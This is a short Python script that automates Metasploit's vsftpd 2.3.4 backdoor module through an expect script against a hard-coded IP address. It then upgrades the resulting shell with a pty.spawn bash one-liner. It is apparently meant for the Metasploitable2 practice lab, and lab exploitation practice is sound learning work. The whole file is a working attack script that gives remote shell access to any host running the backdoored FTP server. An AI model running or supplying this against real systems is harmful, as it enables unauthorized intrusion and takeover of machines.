# Python script to exploit Vsftpd in metasploitable2, using metasploit

# VSFTPD (Very secure FTP Deamon) is a File Transfer Protocol (FTP) used to transfer files from one host to another over FTP-based network.

# Import necessary library

import subprocess

def vsftpd_exploit():
    # Target IP
    target_ip = "192.168.0.2"

    # Metasploit commands as a single string
    commands = f"""
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS {target_ip}
    exploit
    python -c 'import pty; pty.spawn("bin/bash")'
    """

    # Create an expect script as a string
    expect_script = f"""
    spawn msfconsole -q
    expect "msf6 >"
    send {{
    {commands}
    }}
    interact
    """

    # Write the script to a file
    with open("expect_script", "w") as expect_file:
        expect_file.write(expect_script)

    # Run the expect script
    subprocess.run(["expect", "expect_script"])

    # Remove the expected scripr file
    subprocess.run(["rm", "expect_script"])

# Run explit function
vsftpd_exploit()



